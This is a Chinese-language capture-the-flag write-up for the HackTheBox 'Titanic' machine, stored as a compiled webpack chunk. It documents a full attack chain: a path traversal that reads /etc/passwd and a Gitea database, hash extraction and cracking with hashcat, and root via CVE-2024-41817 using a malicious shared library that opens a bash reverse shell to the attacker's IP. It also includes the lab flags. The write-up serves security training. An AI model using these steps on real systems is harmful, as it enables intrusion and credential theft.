"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1429],{57797:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>p,frontMatter:()=>r,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"HackTheBox/Machines/Titanic/index","title":"Titanic","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/Titanic/index.md","sourceDirName":"HackTheBox/Machines/Titanic","slug":"/HackTheBox/Machines/Titanic/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Titanic/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Titanic/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Spectra","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Spectra/"},"next":{"title":"UnderPass","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/UnderPass/"}}');var i=s(74848),a=s(28453);const r={},o="Titanic",l={},c=[{value:"ENTRY POINT",id:"entry-point",level:2},{value:"\u8d44\u4ea7\u63a2\u6d4b",id:"\u8d44\u4ea7\u63a2\u6d4b",level:2},{value:"Port 80 Web Service",id:"port-80-web-service",level:2},{value:"\u5206\u6790\u73af\u5883\u4fe1\u606f",id:"\u5206\u6790\u73af\u5883\u4fe1\u606f",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"Subdomain Brute",id:"subdomain-brute",level:2},{value:"Gitea Database Leak",id:"gitea-database-leak",level:2},{value:"User - developer",id:"user---developer",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"titanic",children:"Titanic"})}),"\n",(0,i.jsxs)(n.admonition,{type:"info",children:[(0,i.jsx)(n.p,{children:"Difficulty: Easy"}),(0,i.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,i.jsx)(n.h2,{id:"entry-point",children:"ENTRY POINT"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"10.10.11.55\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u8d44\u4ea7\u63a2\u6d4b",children:"\u8d44\u4ea7\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.55\nNmap scan report for bogon (10.10.11.55)\nHost is up (0.12s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE    VERSION\n22/tcp open  tcpwrapped\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n80/tcp open  http       Apache httpd 2.4.52\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Did not follow redirect to http://titanic.htb/\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nUptime guess: 1.682 days (since Wed Mar 26 22:58:07 2025)\nNetwork Distance: 2 hops\nTCP Sequence Prediction: Difficulty=263 (Good luck!)\nIP ID Sequence Generation: All zeros\nService Info: Host: titanic.htb\n"})}),"\n",(0,i.jsx)(n.h2,{id:"port-80-web-service",children:"Port 80 Web Service"}),"\n",(0,i.jsx)(n.p,{children:"\u6dfb\u52a0 hosts \u8bb0\u5f55\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(37843).A+"",width:"2560",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u9875\u9762\u4e0a\u53ea\u6709\u4e00\u4e2a\u9884\u5b9a\u8239\u7968\u7684\u4ea4\u4e92\u70b9"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(50886).A+"",width:"2560",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u4e0a\u4f20\u6570\u636e\u4e4b\u540e\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a json \u6570\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-json",children:'{\n    "name": "vaalacat/push_f12",\n    "email": "12@12.com",\n    "phone": "12",\n    "date": "1212-12-12",\n    "cabin": "Standard"\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6ce8\u610f\u5230\u9875\u9762\u6307\u7eb9\uff0c\u53ef\u80fd\u5b58\u5728\u6709 SSTI \u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(54811).A+"",width:"758",height:"830"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u57fa\u672c\u7684\u6d4b\u8bd5 payload"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(67532).A+"",width:"2560",height:"1371"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-json",children:'{\n    "name": "{{7+7}}",\n    "email": "{{7+7}}@1.com",\n    "phone": "{{7+7}}",\n    "date": "1212-12-12",\n    "cabin": "Standard"\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u5e76\u672a\u8d77\u6548"}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u67e5\u770b\u7f51\u7edc\u901a\u4fe1\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53d1\u73b0\u5176\u5b58\u5728\u6709\u8def\u52b2\u7a7f\u8d8a\u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ http get http://titanic.htb/download?ticket=../../../../../../etc/hostname\nHTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Disposition: attachment; filename="../../../../../../etc/hostname"\nContent-Length: 8\nContent-Type: application/octet-stream\nDate: Fri, 28 Mar 2025 07:12:36 GMT\nETag: "1722523321.3563066-8-1490357844"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Thu, 01 Aug 2024 14:42:01 GMT\nServer: Werkzeug/3.0.3 Python/3.10.12\n\ntitanic\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u53c2\u8003 Flask \u5e38\u89c1\u7684\u5f00\u53d1\u5b88\u5219\uff0c\u5c1d\u8bd5\u8bfb\u53d6\u7a0b\u5e8f\u6e90\u7801"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:"# http get http://titanic.htb/download?ticket=../app.py\nfrom flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response\nimport os\nimport json\nfrom uuid import uuid4\n\napp = Flask(__name__)\n\n# Directory to save the JSON files\nTICKETS_DIR = \"tickets\"\n\n# Ensure the directory exists\nif not os.path.exists(TICKETS_DIR):\n    os.makedirs(TICKETS_DIR)\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/book', methods=['POST'])\ndef book_ticket():\n    data = {\n        \"name\": request.form['name'],\n        \"email\": request.form['email'],\n        \"phone\": request.form['phone'],\n        \"date\": request.form['date'],\n        \"cabin\": request.form['cabin']\n    }\n\n    # Generate a unique ID for the ticket\n    ticket_id = str(uuid4())\n    json_filename = f\"{ticket_id}.json\"\n    json_filepath = os.path.join(TICKETS_DIR, json_filename)\n\n    # Save the data as a JSON file\n    with open(json_filepath, 'w') as json_file:\n        json.dump(data, json_file)\n\n    # Redirect to the download URL with the ticket filename\n    return redirect(url_for('download_ticket', ticket=json_filename))\n\n@app.route('/download', methods=['GET'])\ndef download_ticket():\n    ticket = request.args.get('ticket')\n    if not ticket:\n        return jsonify({\"error\": \"Ticket parameter is required\"}), 400\n\n    json_filepath = os.path.join(TICKETS_DIR, ticket)\n\n    if os.path.exists(json_filepath):\n        return send_file(json_filepath, as_attachment=True, download_name=ticket)\n    else:\n        return jsonify({\"error\": \"Ticket not found\"}), 404\n\nif __name__ == '__main__':\n    app.run(host='127.0.0.1', port=5000)\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7ecf\u8fc7\u7b80\u5355\u7684\u4ee3\u7801\u5ba1\u8ba1\uff0c\u5176\u5e76\u672a\u5b58\u5728\u6709 RCE \u7684\u5229\u7528\u53ef\u80fd\u6027"}),"\n",(0,i.jsx)(n.h2,{id:"\u5206\u6790\u73af\u5883\u4fe1\u606f",children:"\u5206\u6790\u73af\u5883\u4fe1\u606f"}),"\n",(0,i.jsxs)(n.p,{children:["\u5c1d\u8bd5\u8bfb\u53d6 ",(0,i.jsx)(n.code,{children:"/etc/passwd"})," \u7684\u6587\u4ef6\u5185\u5bb9"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\npollinate:x:105:1::/var/cache/pollinate:/bin/false\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\nsyslog:x:107:113::/home/syslog:/usr/sbin/nologin\nuuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\ntss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\nlandscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\nfwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\nusbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\nlxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u5176\u4e2d\u5206\u6790\u5b58\u5728\u6709\u4ee5\u4e0b\u7528\u6237\u8d26\u6237"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"root:x:0:0:root:/root:/bin/bash\ndeveloper:x:1000:1000:developer:/home/developer:/bin/bash\n"})}),"\n",(0,i.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,i.jsx)(n.p,{children:"\u901a\u8fc7\u8def\u5f84\u7a7f\u8d8a\uff0c\u53ef\u4ee5\u5f97\u5230"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",metastring:'title="/home/developer/user.txt"',children:"1e8046aa82b0f33c2eb157145fc6cf9c\n"})}),"\n",(0,i.jsx)(n.h2,{id:"subdomain-brute",children:"Subdomain Brute"}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u5bf9\u5b50\u57df\u540d\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://titanic.htb -H 'Host: FUZZ.titanic.htb' -fc 301\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://titanic.htb\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n :: Header           : Host: FUZZ.titanic.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 301\n________________________________________________\n\ndev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 246ms]\n"})}),"\n",(0,i.jsx)(n.h2,{id:"gitea-database-leak",children:"Gitea Database Leak"}),"\n",(0,i.jsx)(n.p,{children:"\u6dfb\u52a0 hosts \u8bb0\u5f55\u4e4b\u540e\uff0c\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(35541).A+"",width:"2560",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u5728 Gitea \u4e2d\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e24\u4e2a\u50a8\u5b58\u5e93"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:s(89315).A+"",width:"2560",height:"1371"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5728 ",(0,i.jsx)(n.code,{children:"http://dev.titanic.htb/developer/docker-config"})," \u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yml",metastring:'title="mysql/docker-compose.yml"',children:"version: '3.8'\n\nservices:\n  mysql:\n    image: mysql:8.0\n    container_name: mysql\n    ports:\n      - \"127.0.0.1:3306:3306\"\n    environment:\n      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'\n      MYSQL_DATABASE: tickets\n      MYSQL_USER: sql_svc\n      MYSQL_PASSWORD: sql_password\n    restart: always\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-yml",metastring:'title="gitea/docker-compose.yml"',children:'version: \'3\'\n\nservices:\n  gitea:\n    image: gitea/gitea\n    container_name: gitea\n    ports:\n      - "127.0.0.1:3000:3000"\n      - "127.0.0.1:2222:22"  # Optional for SSH access\n    volumes:\n      - /home/developer/gitea/data:/data # Replace with your path\n    environment:\n      - USER_UID=1000\n      - USER_GID=1000\n    restart: always\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u540c\u65f6\uff0c\u786e\u5b9a Gitea \u7684\u7248\u672c\u662f ",(0,i.jsx)(n.code,{children:"1.22.1"})]}),"\n",(0,i.jsxs)(n.p,{children:["\u6839\u636e Gitea \u7684\u5b98\u65b9\u6587\u6863\uff0c\u53ef\u4ee5\u63a8\u65ad\u6570\u636e\u5e93\u6587\u4ef6\u53ef\u80fd\u4f4d\u4e8e ",(0,i.jsx)(n.code,{children:"/home/developer/gitea/data/gitea/gitea.db"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ wget http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db\n--2025-03-28 15:47:25--  http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db\n\u6b63\u5728\u89e3\u6790\u4e3b\u673a titanic.htb (titanic.htb)... 10.10.11.55\n\u6b63\u5728\u8fde\u63a5 titanic.htb (titanic.htb)|10.10.11.55|:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a2084864 (2.0M) [application/octet-stream]\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cdownload?ticket=..%2F..%2F..%2F..%2Fhome%2Fdeveloper%2Fgitea%2Fdata%2Fgitea%2Fgitea.db\u201d\n\ndownload?ticket=..%2F..%2F..%2F..%2Fhome%2Fdevelope 100%[===================================================================================================================>]   1.99M   749KB/s  \u7528\u65f6 2.7s\n\n2025-03-28 15:47:29 (749 KB/s) - \u5df2\u4fdd\u5b58 \u201cdownload?ticket=..%2F..%2F..%2F..%2Fhome%2Fdeveloper%2Fgitea%2Fdata%2Fgitea%2Fgitea.db\u201d [2084864/2084864])\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u540c\u65f6\u5728\u7f51\u4e0a\uff0c\u627e\u5230\u8fd9\u4efd ",(0,i.jsx)(n.a,{href:"https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271",children:"gitea2hashcat.py"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import sqlite3\nimport base64\nimport sys\n\nif len(sys.argv) != 2:\n    print("Usage: python3 gitea3hashcat.py <gitea.db>")\n    sys.exit(1)\n\ntry:\n    con = sqlite3.connect(sys.argv[1])\n    cursor = con.cursor()\n    cursor.execute("SELECT name,passwd_hash_algo,salt,passwd FROM user")\n    for row in cursor.fetchall():\n        if "pbkdf2" in row[1]:\n            algo, iterations, keylen = row[1].split("$")\n            algo = "sha256"\n            name = row[0]\n        else:\n            raise Exception("Unknown Algorithm")\n        salt = bytes.fromhex(row[2])\n        passwd = bytes.fromhex(row[3])\n        salt_b64 = base64.b64encode(salt).decode("utf-8")\n        passwd_b64 = base64.b64encode(passwd).decode("utf-8")\n        print(f"{name}:{algo}:{iterations}:{salt_b64}:{passwd_b64}")\nexcept Exception as e:\n    print(f"Error: {e}")\n    sys.exit(1)\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u8fd0\u884c\u540e\uff0c\u53ef\u4ee5\u5f97\u5230 Gitea \u7684\u8eab\u4efd\u51ed\u636e\u54c8\u5e0c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"PS D:\\_Code\\test> python .\\test-12.py .\\gitea.db\nadministrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=\ndeveloper:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528 Hashcat \u5bf9\u51ed\u636e\u54c8\u5e0c\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="hash.txt"',children:"sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=\nsha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"PS D:\\_Tools\\hashcat-6.2.6> .\\hashcat.exe -d 1 -O -a 0 -m 10900 .\\hash.txt .\\dics\\rockyou.txt --show\nsha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f97\u5230\u4e86\u4e00\u4efd\u7528\u6237\u51ed\u636e ",(0,i.jsx)(n.code,{children:"developer:25282528"})]}),"\n",(0,i.jsx)(n.h2,{id:"user---developer",children:"User - developer"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs developer@10.10.11.55\n[16:06:01] Welcome to pwncat \ud83d\udc08!\nPassword: ********\n[16:06:10] 10.10.11.55:22: registered new host w/ db\n(local) pwncat$ back\n(remote) developer@titanic:/home/developer$ whoami\ndeveloper\n"})}),"\n",(0,i.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"linpeas.sh"})," \u5206\u6790\u63d0\u6743\u53ef\u80fd\u6027"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 PATH\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses\n/home/developer/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n\n                                   \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n                                   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container related tools present (if any):\n/usr/bin/docker\n/snap/bin/lxc\n/usr/sbin/runc\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Am I Containered?\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container details\n\u2550\u2563 Is this a container? ........... No\n\u2550\u2563 Any running containers? ........ No\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u672a\u53d1\u73b0\u6709\u7528\u7684\u63d0\u6743\u4fe1\u606f"}),"\n",(0,i.jsxs)(n.p,{children:["\u5c1d\u8bd5\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"pspy"})," \u76d1\u63a7\u7cfb\u7edf\u8fdb\u7a0b"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) developer@titanic:/tmp$ ./pspy64 -f=true\npspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d\n\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592\n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591\n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591\n                   \u2591           \u2591 \u2591\n                               \u2591 \u2591\n\nConfig: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n......\n2025/03/28 08:44:01 FS:                 OPEN | /opt/scripts/identify_images.sh\n2025/03/28 08:44:01 FS:               ACCESS | /opt/scripts/identify_images.sh\n2025/03/28 08:44:01 FS:        CLOSE_NOWRITE | /opt/scripts/identify_images.sh\n2025/03/28 08:44:01 FS:                 OPEN | /opt/scripts/identify_images.sh\n2025/03/28 08:44:01 FS:               ACCESS | /opt/scripts/identify_images.sh\n2025/03/28 08:44:01 FS:        CLOSE_NOWRITE | /opt/scripts/identify_images.sh\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u540c\u65f6\u67e5\u770b\u811a\u672c\u5185\u5bb9"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",metastring:'title="/opt/scripts/identify_images.sh"',children:'cd /opt/app/static/assets/images\ntruncate -s 0 metadata.log\nfind /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u63a8\u6d4b\u662f\u5b58\u5728\u6709\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684\u5b9a\u65f6\u4efb\u52a1\uff0c\u5c1d\u8bd5\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"CVE-2024-41817"})," \u8fdb\u884c\u63d0\u6743"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) developer@titanic:/tmp$ cd /opt/app/static/assets/images/\n(remote) developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\n__attribute__((constructor)) void init(){\n    system(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.31/8888 0>&1'\");\n    exit(0);\n}\nEOF\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7a0d\u7b49\u7247\u523b\uff0c\u5373\u53ef\u6536\u5230\u56de\u8fde\u7684shell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark\u327fkali)-[~/tools]\n\u2514\u2500$ nc -lvnp 8888\nlistening on [any] 8888 ...\nconnect to [10.10.16.31] from (UNKNOWN) [10.10.11.55] 60986\nbash: cannot set terminal process group (2655): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@titanic:/opt/app/static/assets/images# whoami\nwhoami\nroot\n"})}),"\n",(0,i.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"4fcedc7f0403a1b2e231e629ca5c60cc\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},37843:(e,n,s)=>{s.d(n,{A:()=>t});const 